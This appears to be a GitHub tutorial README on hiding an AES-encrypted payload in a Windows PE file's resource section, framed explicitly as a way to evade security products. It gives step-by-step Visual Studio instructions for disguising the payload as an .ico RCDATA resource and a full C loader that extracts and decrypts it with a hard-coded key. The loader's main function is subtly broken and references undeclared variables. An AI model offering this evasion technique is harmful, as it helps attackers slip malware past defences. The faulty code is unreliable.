# Intro
This will provide information on storing payloads in the resources (.rsrc) section of a PE (Portable Executable) file. 

# Quick Primer
The resource section of a Portable Executable (PE) file is designed to store assets such as icons and bitmaps. Malware authors find it appealing to embed payloads in this section because it offers a streamlined method for storage without the memory constraints imposed by other PE sections, such as `.data` or `.rdata`.


# Python Helper Script
Encrypting payloads is a critical technique for evading security solutions, as it prevents static analysis of the payload when written to disk. Incorporating an encrypted payload into the resource section of a Portable Executable (PE) file can be challenging. To simplify this process, I've created a helper script that encrypts a raw binary file and generates an encrypted output, along with printing a C character array of the encrypted payload with the IV and Key. This encrypted binary can be seamlessly used in the steps outlined below.

Below is a screenshot of [aes-encrypt.py](aes-encrypt.py) in action.
![image](https://github.com/user-attachments/assets/b4a59469-8218-4622-b477-345238dd55e0)


# Steps
1. Inside Visual Studio, right-click on 'Resource files' then click Add > New Item.
![image](https://github.com/user-attachments/assets/df386350-1794-4192-97d4-26844ff7925f)

2. Click on 'Resource File'
![image](https://github.com/user-attachments/assets/9e7920c8-1c3d-4cfd-a518-25837c4d241a)

3. This will generate a new sidebar, the Resource View. Right-click on the .rc file (Resource.rc is the default name), and select the 'Add Resource' option. <br>
![image](https://github.com/user-attachments/assets/a237bb90-1e85-4dea-89a8-9bbd1fa55f2c)

4. Click 'Import'.
![image](https://github.com/user-attachments/assets/c72fd8cf-8a66-488a-9115-66543f6b7a1b)

5. Select your .ico file, which is the encrypted payload renamed to have the `ico` extension.
![image](https://github.com/user-attachments/assets/78bd1c47-ab39-4285-9a1a-6f502f14ecd8)

6. A prompt will appear requesting the resource type. Enter "RCDATA" without the quotes.
![image](https://github.com/user-attachments/assets/946752af-70b2-4dcc-b096-8eda51e029ba)

7. After clicking OK, the payload should be displayed in raw binary format within the Visual Studio project
![image](https://github.com/user-attachments/assets/7b4b4cdc-588e-4256-9cb1-2026c2123651)

8. When exiting the Resource View, the "resource.h" header file should be visible and named according to the .rc file from Step 2. This file contains a define statement that refers to the payload's ID in the resource section (IDR_RCDATA1). This is important in order to be able to retrieve the payload from the resource section later.
![image](https://github.com/user-attachments/assets/50923c95-bf16-45d8-85e7-098734d7ba88)

# Code Integration
Four APIs are used: <br>
- [FindResourceW](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew) - Get the location of the specified data stored in the resource section of a special ID passed in (this is defined in the header file)
- [LoadResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource) - Retrieves a HGLOBAL handle of the resource data. This handle can be used to obtain the base address of the specified resource in memory.
- [LockResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource) -  Obtain a pointer to the specified data in the resource section from its handle.
- [SizeofResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource) - Get the size of the specified data in the resource section.

Below is a code snippet of decrypting the encrypted payload from the resource section:
```C
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include "resource.h"
#pragma comment(lib, "Bcrypt.lib")

// Define keysize and NTSTATUS codes for AES encryption function
#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define KEYSIZE 32
#define IVSIZE 16

// Intialize AES struct
typedef struct _AES {
    PBYTE pPlainText;      // base address of the plain text data
    DWORD dwPlainSize;     // size of the plain text data
    PBYTE pCipherText;     // base address of the encrypted data
    DWORD dwCipherSize;    // size of it
    PBYTE pKey;            // the 32 byte key
    PBYTE pIv;             // the 16 byte iv
} AES, * PAES;

// Function to load AES encryption
BOOL InstallAesDecryption(PAES pAes) {
    if (!pAes || !pAes->pCipherText || !pAes->pKey || !pAes->pIv || pAes->dwCipherSize == 0) {
        printf("[!] Invalid AES parameters\n");
        return FALSE;
    }

    BOOL bSTATE = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = 0;
    DWORD dwBlockSize = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0;
    NTSTATUS STATUS = 0;

    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (dwBlockSize != 16) {
        printf("[!] Unexpected block size: %d\n", dwBlockSize);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        printf("[!] HeapAlloc for key object failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        printf("[!] HeapAlloc for plaintext failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

_EndOfFunc:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    else if (pbPlainText) {
        HeapFree(GetProcessHeap(), 0, pbPlainText);
    }
    return bSTATE;
}

// Function to decrypt encrypted payload
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv || !pPlainTextData || !sPlainTextSize) return FALSE;

    AES Aes = {
        .pKey = pKey,
        .pIv = pIv,
        .pCipherText = pCipherTextData,
        .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) return FALSE;

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}

int main() {
    unsigned char key[] = {
        0xF0, 0x0A, 0xDB, 0x4A, 0x74, 0x13, 0xFF, 0xC9, 0x2F, 0x3C, 0x2A, 0x64, 0x01, 0x76, 0xF7, 0x73,
        0x08, 0x08, 0xC4, 0x08, 0x84, 0x83, 0x15, 0x3C, 0xC7, 0x62, 0x8B, 0x16, 0x78, 0xE9, 0xBE, 0xC9
    };

    unsigned char iv[] = {
        0xFC, 0xB6, 0x0B, 0x04, 0x36, 0x67, 0x2C, 0x76, 0x17, 0x76, 0x47, 0x3F, 0xDE, 0x07, 0xFA, 0xBF
    };

    // Load the encrypted payload from the resource section
    printf("[i] Loading encrypted payload from resource...");
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (hResource == NULL) {
        printf("[!] FindResource Failed: %d\n", GetLastError());
        return 1;
    }
    printf("\t Done!\n");

    DWORD dwCipherTextSize = SizeofResource(NULL, hResource);
    if (dwCipherTextSize == 0) {
        printf("[!] SizeofResource Failed: %d\n", GetLastError());
        return 1;
    }

    HGLOBAL hResData = LoadResource(NULL, hResource);
    if (hResData == NULL) {
        printf("[!] LoadResource Failed: %d\n", GetLastError());
        return 1;
    }

    PVOID pCipherText = LockResource(hResData);
    if (pCipherText == NULL) {
        printf("[!] LockResource Failed: %d\n", GetLastError());
        return 1;
    }

    printf("[i] Encrypted payload loaded, size: %lu bytes\n", dwCipherTextSize);

    // Decrypt the payload
    printf("[i] Decrypting Payload...\n");
    if (!SimpleDecryption(pCipherText, dwCipherTextSize, key, iv, &pPlainText, &dwsPlainTextSize)) {
        printf("[!] SimpleDecryption Failed\n");
        CloseHandle(hProcess);
        CloseHandle(hThread);
        CloseHandle(hParentProcess);
        return 1;
    }
    printf("[i] Decrypted payload size: %lu bytes\n", dwsPlainTextSize);
}
```

